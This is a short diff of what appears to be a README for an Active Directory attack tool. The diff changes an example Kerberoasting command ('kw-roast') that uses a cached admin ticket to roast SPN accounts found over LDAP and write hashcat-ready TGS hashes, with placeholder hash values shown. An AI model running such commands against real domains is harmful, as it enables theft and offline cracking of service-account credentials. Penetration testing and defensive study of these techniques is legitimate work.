@@ -30,10 +30,9 @@ Plus pcap extraction of NTLM hashes (NTLMv1/v2 from 9 transports) and LDAP simpl
 Kerberoast every SPN account discovered over LDAP and write hashcat-ready hashes:
 
 ```console
-$ kw-roast -k -c admin.ccache --ldap
-[+] sql_svc      $krb5tgs$23$sql_svc$CORP.LOCAL$<checksum>$<edata2>   (hashcat 13100)
-[+] backup_svc   $krb5tgs$18$backup_svc$CORP.LOCAL$<checksum>$<edata2>  (hashcat 19700)
-[*] 2 SPN accounts roasted -> hashes.txt
+$ kw-roast -k -c admin.ccache --ldap -o hashes.txt
+$krb5tgs$23$sql_svc$CORP.LOCAL$<checksum>$<edata2>
+$krb5tgs$18$backup_svc$CORP.LOCAL$<checksum>$<edata2>
 ```
 
 ## Installation
